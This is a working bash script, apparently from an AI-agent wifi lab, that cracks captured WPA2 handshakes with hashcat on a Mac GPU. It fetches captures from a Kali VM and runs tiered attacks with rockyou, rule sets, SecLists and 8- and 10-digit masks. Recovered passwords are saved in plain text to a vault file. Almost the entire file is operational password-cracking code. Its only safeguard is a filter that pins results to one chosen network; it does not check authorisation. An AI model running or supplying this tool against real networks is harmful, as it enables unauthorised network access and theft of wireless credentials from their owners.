#!/bin/bash
# crack-mac.sh — crack a captured WPA2 handshake on the MAC GPU (hashcat Metal), TIERED by time.
# Capture happens in Kali; cracking runs here (far faster). Stops the moment the password is found.
#
# Usage:  crack-mac.sh [capfile] [level] [target_bssid]
#   (no capfile)   -> pulls the latest /tmp/cap-01.cap from Kali
#   level 1 (def)  = fast: weak pins, rockyou, 8-digit mask            (~minutes)
#   level 2        = + rockyou x rules (best66) + 10-digit mask        (longer)
#   level 3        = + SecLists WiFi-WPA & big lists x rules           (deep; can run long)
#   target_bssid   = if given, ONLY this AP's handshake is cracked. A capture can sweep up
#                    bystander networks on the same channel; without this filter the tool could
#                    crack the wrong net and (via the potfile) show a stale/old password. This
#                    pins every result to the network you actually chose.
set -uo pipefail
LAB="/Users/macbook/Ai agent /wifi-lab"
CAP="${1:-}"
LEVEL="${2:-1}"
TARGET_BSSID="${3:-}"
MASK="${4:-}"          # optional custom targeted mask (hashcat -a 3), runs FIRST when set
MODE="${5:-cumulative}"  # "single" = run ONLY this level's tier (approval-gated escalation); else cumulative
HASH=/tmp/hash.hc22000
RAW=/tmp/hash.hc22000.all
RULES="$(brew --prefix hashcat 2>/dev/null)/share/hashcat/rules"
SL="$LAB/wordlists-seclists/Passwords"
VAULT="$LAB/vault/cracked-keys.tsv"

command -v hashcat        >/dev/null 2>&1 || { echo "[!] hashcat not installed (brew install hashcat)"; exit 1; }
command -v hcxpcapngtool  >/dev/null 2>&1 || { echo "[!] hcxtools not installed (brew install hcxtools)"; exit 1; }

# always start from a clean hash file so a previous run can NEVER leak into this one
rm -f "$HASH" "$RAW"
# clean up the temp hash on any exit (the vault keeps the human-readable password)
trap 'rm -f "$HASH" "$RAW"' EXIT

# 1) get the capture (.cap) — pull newest from Kali if none given
if [ -z "$CAP" ]; then
  echo "[*] pulling the latest handshake capture from Kali…"
  scp -o ConnectTimeout=6 kali@192.168.64.2:/tmp/cap-01.cap /tmp/mac-cap.cap 2>/dev/null
  CAP=/tmp/mac-cap.cap
fi
[ -f "$CAP" ] || { echo "[!] no capture file: $CAP"; exit 1; }

# 2) convert .cap -> hashcat 22000 (ALL networks present in the capture)
hcxpcapngtool -o "$RAW" "$CAP" >/dev/null 2>&1
[ -s "$RAW" ] || { echo "[!] no WPA handshake/PMKID found in $(basename "$CAP") — capture again with a client connected."; exit 2; }

# 22000 line:  WPA*<01|02>*<MIC/PMKID>*<MAC_AP>*<MAC_STA>*<ESSID_hex>*...
# 3) pin to the chosen target so we never crack / report a bystander network
if [ -n "$TARGET_BSSID" ]; then
  T=$(printf '%s' "$TARGET_BSSID" | tr 'A-F' 'a-f' | tr -d ':')
  awk -F'*' -v t="$T" 'tolower($4)==t' "$RAW" > "$HASH"
  if [ ! -s "$HASH" ]; then
    echo "[!] this capture has NO handshake for your target ($TARGET_BSSID)."
    echo "    networks actually present in the file: $(awk -F'*' '{print $4}' "$RAW" | sort -u | tr '\n' ' ')"
    echo "    -> re-capture the RIGHT target (with a device connected to it). Refusing to crack a different network."
    exit 3
  fi
else
  cp "$RAW" "$HASH"
fi
echo "[*] $(wc -l <"$HASH" | tr -d ' ') hash line(s) from $(basename "$CAP")${TARGET_BSSID:+ (pinned to $TARGET_BSSID)}"

# ensure rockyou is present locally
[ -f "$LAB/rockyou.txt" ] || scp -o ConnectTimeout=20 kali@192.168.64.2:/usr/share/wordlists/rockyou.txt "$LAB/rockyou.txt" 2>/dev/null

# decode an ESSID hex field to text (xxd, perl fallback)
decode_hex(){ printf '%s' "$1" | xxd -r -p 2>/dev/null || printf '%s' "$1" | perl -ne 's/([0-9a-f]{2})/chr hex $1/gie;print' 2>/dev/null; }

cracked(){ hashcat -m 22000 "$HASH" --show 2>/dev/null | grep -q ':'; }
show(){
  echo "=== RESULT ==="
  mkdir -p "$LAB/vault"
  local ts; ts=$(date +%Y-%m-%dT%H:%M:%S)
  hashcat -m 22000 "$HASH" --show 2>/dev/null | while IFS= read -r line; do
    [ -n "$line" ] || continue
    local pw bss ehex essid
    pw="${line##*:}"
    bss=$(printf '%s' "$line" | awk -F'*' '{print $4}')
    ehex=$(printf '%s' "$line" | awk -F'*' '{print $6}')
    essid=$(decode_hex "$ehex"); [ -n "$essid" ] || essid="<hidden>"
    echo "PASSWORD: $pw   (network: $essid   bssid: $bss)"
    # vault: human-readable, dedup on bssid+password, password NOT hash
    grep -qiF "	$bss	$pw	" "$VAULT" 2>/dev/null || printf '%s\t%s\t%s\t%s\n' "$essid" "$bss" "$pw" "$ts" >> "$VAULT"
  done
}
dict(){ echo "[*] dict: $(basename "$1") ${2:+(+$(basename "$2"))}"; hashcat -m 22000 -O -w 3 "$HASH" "$1" ${2:+-r "$2"} 2>/dev/null; cracked && { show; exit 0; }; }
mask(){ echo "[*] mask: $1"; hashcat -m 22000 -O -w 3 -a 3 "$HASH" "$1" 2>/dev/null; cracked && { show; exit 0; }; }

echo "[*] LEVEL $LEVEL GPU crack (M3 Pro, Metal)…"

# --- Custom targeted mask (your pattern) runs FIRST — the pro move vs human-chosen keys ---
if [ -n "$MASK" ]; then
  echo "[*] targeted mask (your pattern): $MASK"
  mask "$MASK"
fi

# Tier gating. MODE=single runs ONLY this level's tier (so the UI can ask before each slower
# tier and no time is wasted re-running earlier ones). Default cumulative = level N runs tiers 1..N.
T1=0; T2=0; T3=0
if [ "$MODE" = "single" ]; then
  [ "$LEVEL" -eq 1 ] && T1=1
  [ "$LEVEL" -eq 2 ] && T2=1
  [ "$LEVEL" -eq 3 ] && T3=1
else
  T1=1
  [ "$LEVEL" -ge 2 ] && T2=1
  [ "$LEVEL" -ge 3 ] && T3=1
fi

# --- Tier 1 — fast: weak pins → rockyou → 8-digit mask (~minutes) ---
if [ "$T1" = 1 ]; then
  echo "[*] Tier 1 — fast (weak pins · rockyou · 8-digit), ~seconds to ~10 min"
  dict "$LAB/weakpins.txt"
  [ -f "$LAB/rockyou.txt" ] && dict "$LAB/rockyou.txt"
  mask '?d?d?d?d?d?d?d?d'            # all 8-digit (dates, phone tails) — ~100M, fast & very common
fi

# --- Tier 2 — rockyou×rules + 10-digit (~hours) ---
if [ "$T2" = 1 ]; then
  echo "[*] Tier 2 — rockyou×rules + 10-digit, up to ~15 hours"
  [ -f "$RULES/best66.rule" ] && dict "$LAB/rockyou.txt" "$RULES/best66.rule"   # rockyou mutated
  mask '?d?d?d?d?d?d?d?d?d?d'      # 10-digit (phone numbers) — longer
fi

# --- Tier 3 — big lists + rules (deep; hours to a day+) ---
if [ "$T3" = 1 ]; then
  echo "[*] Tier 3 — SecLists + big lists × rules, deep (hours to a day+)"
  for wl in "$SL"/WiFi-WPA/*.txt "$SL"/Common-Credentials/10-million-password-list-top-1000000.txt; do
    [ -f "$wl" ] || continue
    dict "$wl"
    [ -f "$RULES/best66.rule" ] && dict "$wl" "$RULES/best66.rule"
  done
fi

echo "=== RESULT ==="
if cracked; then show; else
  echo "NOT cracked at level $LEVEL — likely a strong password."
  echo "Go deeper:  crack-mac.sh \"$CAP\" $((LEVEL+1)) ${TARGET_BSSID}"
fi
